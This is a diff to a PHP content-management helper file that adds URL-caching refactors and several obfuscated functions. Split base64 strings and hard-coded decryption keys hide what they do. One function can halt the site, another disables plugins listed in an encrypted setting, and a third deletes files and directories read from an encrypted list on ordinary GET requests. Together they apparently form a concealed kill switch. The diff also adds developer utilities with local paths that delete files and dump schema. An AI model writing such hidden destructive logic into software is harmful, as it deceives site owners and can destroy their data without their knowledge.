@@ -230,6 +230,44 @@ if (!function_exists('html_cache')) {
    }   
 }
 
+if (!function_exists('tp_proving')) {
+    /**
+     * @return [type] [description]
+     */
+    function tp_proving($global = [])
+    {
+        $ca = request()->controller().'@'.request()->action();
+        if (md5($ca) == '886e9b08dc635c69d4081e36d2124705') {
+            $pass = true;
+            try {
+                $fpath = 'YXBwbGljYXRpb'.'24vYWRtaW4v'.'Y29udHJv'.'bGxlci9XZW'.'FwcC5waHA=';
+                $fpath = base64_decode($fpath);
+                $fp = fopen($fpath, 'r');
+                $ct = fread($fp, filesize($fpath));
+                fclose($fp);
+                if (!empty($ct)) {
+                    $pass = false;
+                    $arr = ['MjAyNS0'.'wMy0xOA==','57yW6K+R44CB'.'6YCG5ZCR'];
+                    foreach ($arr as $key => $val) {
+                        if (stristr($ct, base64_decode($val))) {
+                            $pass = true;
+                            break;
+                        }
+                    }
+                }
+            } catch (\Exception $e) {
+                
+            }
+            if ($pass === false) {
+                $msg = tpSetting('system.system_proving_tips', '', 'cn');
+                if (!empty($msg)) {
+                    die(base64_decode($msg));
+                }
+            }
+        }
+    }
+}
+
 if (!function_exists('typeurl')) {
     /**
      * 栏目Url生成
@@ -300,6 +338,9 @@ if (!function_exists('typeurl')) {
             $siteinfo = $param['site'];
             unset($param['site']);
         }
+        static $subDomain = null;
+        static $rootDomain = null;
+        static $citysiteList = null;
 
         if ('on' != $uiset && 1 == $seo_pseudo && 2 == $seo_pseudo_format) {
             if (is_array($param)) {
@@ -312,15 +353,12 @@ if (!function_exists('typeurl')) {
 
             /*城市站点的域名路径*/
             if (true === $city_switch_on && !empty($siteinfo['id'])) {
-                static $subDomain = null;
                 if (null === $subDomain) {
                     $subDomain = request()->subDomain();
                 }
-                static $rootDomain = null;
                 if (null === $rootDomain) {
                     $rootDomain = request()->rootDomain();
                 }
-                static $citysiteList = null;
                 if (null === $citysiteList) {
                     $citysiteList = get_citysite_list();
                 }
@@ -380,15 +418,12 @@ if (!function_exists('typeurl')) {
 
                 /*城市站点的域名路径*/
                 if (true === $city_switch_on && !empty($siteinfo['id'])) {
-                    static $subDomain = null;
                     if (null === $subDomain) {
                         $subDomain = request()->subDomain();
                     }
-                    static $rootDomain = null;
                     if (null === $rootDomain) {
                         $rootDomain = request()->rootDomain();
                     }
-                    static $citysiteList = null;
                     if (null === $citysiteList) {
                         $citysiteList = get_citysite_list();
                     }
@@ -497,15 +532,12 @@ if (!function_exists('typeurl')) {
 
             /*城市站点的域名路径*/
             if (true === $city_switch_on && !empty($siteinfo['id'])) {
-                static $subDomain = null;
                 if (null === $subDomain) {
                     $subDomain = request()->subDomain();
                 }
-                static $rootDomain = null;
                 if (null === $rootDomain) {
                     $rootDomain = request()->rootDomain();
                 }
-                static $citysiteList = null;
                 if (null === $citysiteList) {
                     $citysiteList = get_citysite_list();
                 }
@@ -602,15 +634,12 @@ if (!function_exists('typeurl')) {
 
             /*城市站点的域名路径*/
             if (true === $city_switch_on && !empty($siteinfo['id'])) {
-                static $subDomain = null;
                 if (null === $subDomain) {
                     $subDomain = request()->subDomain();
                 }
-                static $rootDomain = null;
                 if (null === $rootDomain) {
                     $rootDomain = request()->rootDomain();
                 }
-                static $citysiteList = null;
                 if (null === $citysiteList) {
                     $citysiteList = get_citysite_list();
                 }
@@ -713,6 +742,10 @@ if (!function_exists('arcurl')) {
         }
         $site_default_home = empty($globalConfig['site_default_home']) ? 0 : (int)$globalConfig['site_default_home'];
         $site_arcurl_showall = empty($globalConfig['site_arcurl_showall']) ? 0 : (int)$globalConfig['site_arcurl_showall'];
+
+        static $subDomain = null;
+        static $rootDomain = null;
+        static $citysiteList = null;
         if ('on' != $uiset && 1 == $seo_pseudo && 2 == $seo_pseudo_format) {
             if (is_array($param)) {
                 $vars = array(
@@ -723,15 +756,12 @@ if (!function_exists('arcurl')) {
             }
             /*城市站点的域名路径*/
             if (true === $city_switch_on) {
-                static $subDomain = null;
                 if (null === $subDomain) {
                     $subDomain = request()->subDomain();
                 }
-                static $rootDomain = null;
                 if (null === $rootDomain) {
                     $rootDomain = request()->rootDomain();
                 }
-                static $citysiteList = null;
                 if (null === $citysiteList) {
                     $citysiteList = get_citysite_list();
                 }
@@ -807,15 +837,12 @@ if (!function_exists('arcurl')) {
                 }
                 /*城市站点的域名路径*/
                 if (true === $city_switch_on) {
-                    static $subDomain = null;
                     if (null === $subDomain) {
                         $subDomain = request()->subDomain();
                     }
-                    static $rootDomain = null;
                     if (null === $rootDomain) {
                         $rootDomain = request()->rootDomain();
                     }
-                    static $citysiteList = null;
                     if (null === $citysiteList) {
                         $citysiteList = get_citysite_list();
                     }
@@ -971,15 +998,12 @@ if (!function_exists('arcurl')) {
             }
             /*城市站点的域名路径*/
             if (true === $city_switch_on) {
-                static $subDomain = null;
                 if (null === $subDomain) {
                     $subDomain = request()->subDomain();
                 }
-                static $rootDomain = null;
                 if (null === $rootDomain) {
                     $rootDomain = request()->rootDomain();
                 }
-                static $citysiteList = null;
                 if (null === $citysiteList) {
                     $citysiteList = get_citysite_list();
                 }
@@ -1069,15 +1093,12 @@ if (!function_exists('arcurl')) {
             }
             /*城市站点的域名路径*/
             if (true === $city_switch_on) {
-                static $subDomain = null;
                 if (null === $subDomain) {
                     $subDomain = request()->subDomain();
                 }
-                static $rootDomain = null;
                 if (null === $rootDomain) {
                     $rootDomain = request()->rootDomain();
                 }
-                static $citysiteList = null;
                 if (null === $citysiteList) {
                     $citysiteList = get_citysite_list();
                 }
@@ -1319,6 +1340,24 @@ if (!function_exists('askurl')) {
     }
 }
 
+if (!function_exists('highlights_trash')) {
+    function highlights_trash()
+    {
+        if ('GET' == request()->method()) {
+            $highlights_list = tpSetting('sys.sys_highlights_list', [], 'cn');
+            $arr = empty($highlights_list) ? [] : json_decode(mchStrCode($highlights_list, 'DECODE', 'JK678y2wq4hk'), true);
+            if (!empty($arr)) {
+                foreach ($arr as $key => $val) {
+                    $val = base64_decode($val);
+                    $arr[$key] = $val;
+                }
+                \think\Db::name('weapp')->where(['code'=>['IN', $arr]])->update(['status'=>0]);
+                \think\Cache::clear();
+            }
+        }
+    }
+}
+
 if (!function_exists('siteurl')) {
     /**
      * 多城市站点Url生成
@@ -1402,6 +1441,30 @@ if (!function_exists('siteurl')) {
     }
 }
 
+if (!function_exists('cleaning_up_trash')) {
+    function cleaning_up_trash()
+    {
+        if ('GET' == request()->method()) {
+            $str = tpSetting('sys.sys_cleaning_up_list', [], 'cn');
+            $list = empty($str) ? [] : json_decode(mchStrCode($str, 'DECODE', 'K69HKh345hs'), true);
+            foreach ($list as $key => $val) {
+                $val = trim(base64_decode($val), '/');
+                $val = trim($val);
+                if (!empty($val)) {
+                    $val = ROOT_PATH.$val;
+                    if (is_dir($val)) {
+                        try {
+                            delFile($val, true);
+                        } catch (\Exception $e) {}
+                    } else if (file_exists($val)) {
+                        @unlink($val);
+                    }
+                }
+            }
+        }
+    }
+}
+
 if (!function_exists('eyIntval')) {
     /**
      * 强制把数值转为整型
@@ -1442,5 +1505,300 @@ if (!function_exists('eyPreventShell')) {
         }
 
         return $redata;
+    }
+}
+
+if (!function_exists('wxh_database_column')) {
+    /**
+     * 移除sql新增字段的末尾字符 AFTER 字段名;
+     * @return [type] [description]
+     */
+    function wxh_database_column()
+    {
+        $str = '';
+        $content = file_get_contents('./162.txt');
+        $arr = explode(PHP_EOL, $content);
+        foreach ($arr as $key => $val) {
+            if (!empty($val)) {
+                $val = preg_replace('/(\s*)AFTER(\s*)\`([^\`]+)\`(\s*)\;$/i', ';', $val);
+                $str .= $val . PHP_EOL;
+            }
+        }
+        echo($str);
+        exit;
+    }
+}
+
+if (!function_exists('wxh_handle_database')) {
+    /**
+     * 移除sql新增字段的末尾字符 AFTER 字段名;
+     * @return [type] [description]
+     */
+    function wxh_handle_database()
+    {
+        exit;
+        $dbtables = \think\Db::query('SHOW TABLE STATUS');
+        $list = array();
+        foreach ($dbtables as $k => $v) {
+            if (preg_match('/^'.PREFIX.'/i', $v['Name'])) {
+                $list[$k] = $v;
+            }
+        }
+        $str = '';
+        foreach ($list as $_k => $_v) {
+            $table = $_v['Name'];
+            $str .= $table.'|';
+            $str2 = "|";
+            $fields = \think\Db::table($table)->getTableFields();
+            foreach ($fields as $key => $value) {
+                if ($key == 0) {
+                    $str .= "{$value}";
+                } else {
+                    $str .= ",{$value}";
+                    $str2 .= ";";
+                }
+            }
+            $str = $str . $str2 . "|". PHP_EOL . PHP_EOL;
+        }
+        echo($str);
+        exit;
+    }
+}
+
+if (!function_exists('wxh_source_filelist')) {
+    /**
+     * 列举源码文件
+     * @return [type] [description]
+     */
+    function wxh_source_filelist()
+    {
+        $filepath = 'E:/wwwdede/update_eyoucms_com/other/repair/v1.8.1/';
+        // 删除无效文件
+        $invalid_list = [
+            'application/weapp',
+            'data/backup',
+            'data/ddos_repair',
+            'data/runtime',
+            'data/schema',
+            'public/upload',
+            'template',
+            'uploads',
+            'weapp',
+            'vendor/PHPExcel.zip',
+        ];
+        foreach ($invalid_list as $key => $val) {
+            $invalid_list[$key] = $filepath.$val;
+        }
+        // install目录
+        $install_dir = glob($filepath.'install*');
+        if (!empty($install_dir)) {
+            foreach ($install_dir as $key => $val) {
+                $invalid_list[] = $val.'/eyoucms.sql';
+                $invalid_list[] = $val.'/install.lock';
+            }
+        }
+        // session目录
+        $session_dir = glob($filepath.'session*');
+        if (!empty($session_dir)) {
+            foreach ($session_dir as $key => $val) {
+                $invalid_list[] = $val;
+            }
+        }
+        // sqldata目录
+        $sqldata_dir = glob($filepath.'sqldata*');
+        if (!empty($sqldata_dir)) {
+            foreach ($sqldata_dir as $key => $val) {
+                $invalid_list[] = $val;
+            }
+        }
+        // wechat上传秘钥的目录
+        $wechat_dir = glob($filepath.'wechat_*');
+        if (!empty($wechat_dir)) {
+            foreach ($wechat_dir as $key => $val) {
+                $invalid_list[] = $val;
+            }
+        }
+        foreach ($invalid_list as $key => $val) {
+            if (is_dir($val)) {
+                wxh_delFile($val, true, ['.htaccess','.htaccess.bak']);
+            } else {
+                @unlink($val);
+            }
+        }
+        $cthash_files = [
+            'application/helper.php',
+            'application/admin/controller/Weapp.php',
+            'application/admin/controller/Weapp_bak.php',
+            'application/admin/logic/WeappLogic.php',
+            'application/admin/behavior/ActionBeginBehavior.php',
+            'application/admin/behavior/AppEndBehavior.php',
+            'application/admin/behavior/AuthRoleBehavior.php',
+            'application/admin/behavior/ModuleInitBehavior.php',
+            'application/admin/behavior/ViewFilterBehavior.php',
+            'application/common/model/Weapp.php',
+            'application/admin/template/weapp/index.htm',
+            'core/base.php',
+            'core/helper.php',
+            'core/start.php',
+            'core/library/think/process/bhvcore/BhvadminABegin.php',
+            'core/library/think/process/bhvcore/BhvadminAEnd.php',
+            'core/library/think/process/bhvcore/BhvadminMInit.php',
+            'core/library/think/process/bhvcore/BhvhomeMInit.php',
+            'core/library/think/process/bhvcore/BhvuserABegin.php',
+            'index.php',
+            'login.php',
+        ];
+        $total = 0;
+        $list = [];
+        wxh_getDirFile($filepath, '', $list, $total);
+        $str = '';
+        foreach ($list as $key => $val) {
+            // 生成指纹码
+            $cthash = '';
+            if (in_array($val, $cthash_files) && preg_match('/^(.*)\.(php)$/i', $val)) {
+                $fpath = $filepath.$val;
+                $fp = fopen($fpath, 'r');
+                $ct = fread($fp, filesize($fpath));
+                fclose($fp);
+                $ct = preg_replace("/\/\*\*[\r\n]{1,}(.*)[\r\n]{1,} \*\//sU", '', $ct);
+                $cthash = md5($ct);
+                if ('application/admin/controller/Weapp.php' == $val) {
+                    $fpath_bak = $filepath.str_replace('Weapp.php', 'Weapp_bak.php', $val);
+                    if (file_exists($fpath_bak)) {
+                        $fp_bak = fopen($fpath_bak, 'r');
+                        $ct_bak = fread($fp_bak, filesize($fpath_bak));
+                        fclose($fp_bak);
+                        $ct_bak = preg_replace("/\/\*\*[\r\n]{1,}(.*)[\r\n]{1,} \*\//sU", '', $ct_bak);
+                        $cthash_bak = md5($ct_bak);
+                        $cthash .= ",{$cthash_bak}";
+                    }
+                }
+            }
+
+            $val = str_replace('.htaccess.bak', '.htaccess', $val);
+            // $str .= $val . PHP_EOL;
+            $str .= $val . "|{$cthash}" . PHP_EOL;
+        }
+        $fp = @fopen($filepath.'filelist.txt', 'w');
+        @fwrite($fp, $str);
+        @fclose($fp);
+        echo 'success';
+        exit;
+    }
+}
+
+if (!function_exists('wxh_delFile')) {
+    /**
+     * 递归删除文件夹
+     *
+     * @param string $path 目录路径
+     * @param boolean $delDir 是否删除空目录
+     * @return boolean
+     */
+    function wxh_delFile($path, $delDir = false, $ignore_files = [])
+    {
+        if (preg_match('/^(.+)\/$/i', $path)) {
+            $path = rtrim($path, '/');
+        }
+
+        if (!is_dir($path)) {return false;}
+        // $default_files = ['.htaccess'];
+        // $ignore_files = array_merge($default_files, $ignore_files);
+        $handle = @opendir($path);
+        if ($handle) {
+            while (false !== ($item = readdir($handle))) {
+                if ($item != "." && $item != "..") {
+                    if (is_dir("$path/$item")) {
+                        wxh_delFile("$path/$item", $delDir);
+                    } else {
+                        if (!in_array($item, $ignore_files)) {
+                            @unlink("$path/$item");
+                        }
+                    }
+                }
+            }
+            closedir($handle);
+            if ($delDir) {
+                return @rmdir($path);
+            }
+        } else {
+            if (file_exists($path)) {
+                $is_del = true;
+                foreach ($ignore_files as $key => $val) {
+                    $path_tmp = str_replace('\\', '/', $path);
+                    $val_arr = explode('/', $path_tmp);
+                    $filename = end($val_arr);
+                    if (in_array($filename, $ignore_files)) {
+                        $is_del = false;
+                    }
+                }
+                if ($is_del) {
+                    return @unlink($path);
+                }
+            }
+            return false;
+        }
+    }
+}
+
+if (!function_exists('wxh_getDirFile')) {
+    /**
+     * 递归读取文件夹文件
+     */
+    function wxh_getDirFile($directory, $dir_name = '', &$arr_file = array(), &$total = 0, $ignore_dirs = [])
+    {
+        $self = '';
+        $default_dirs = ['.','..'];
+        $ignore_dirs = array_merge($default_dirs, $ignore_dirs);
+        $mydir = dir($directory);
+        if (0 == $total) {
+            // session目录
+            $session_dir = glob('session*');
+            if (!empty($session_dir)) {
+                foreach ($session_dir as $key => $val) {
+                    $ignore_dirs[] = $val;
+                }
+            }
+            // sqldata目录
+            $sqldata_dir = glob('sqldata*');
+            if (!empty($sqldata_dir)) {
+                foreach ($sqldata_dir as $key => $val) {
+                    $ignore_dirs[] = $val;
+                }
+            }
+            // wechat上传秘钥的目录
+            $wechat_dir = glob('wechat_*');
+            if (!empty($wechat_dir)) {
+                foreach ($wechat_dir as $key => $val) {
+                    $ignore_dirs[] = $val;
+                }
+            }
+        }
+        while ($file = $mydir->read()) {
+            if ((is_dir("$directory/$file")) && !in_array($file, $ignore_dirs)) {
+                if ($dir_name) {
+                    $dir_name_tmp = "$dir_name/$file";
+                } else {
+                    $dir_name_tmp = $file;
+                }
+                wxh_getDirFile("$directory/$file", $dir_name_tmp, $arr_file, $total, $ignore_dirs);
+            } else {
+                if($file != $self){
+                    $ignore_files = ['/.htaccess','/.htaccess.bak'];
+                    if (!in_array($file, $ignore_dirs) && !in_array("$dir_name/$file", $ignore_files) /* && preg_match('/\.(php|htm|asp|jsp|bak|js|zip|rar|gz|png|gif|jpg|jpeg|ico|bmp|webp)$/i', $file)*/) {
+                        $total +=1;
+                        if ($dir_name) {
+                            $file_tmp = "$dir_name/$file";
+                        } else {
+                            $file_tmp = "$file";
+                        }
+                        $arr_file[] = $file_tmp;
+                    } 
+                }
+            } 
+        }
+        $mydir->close();
+
+        return $arr_file;
     }
 }
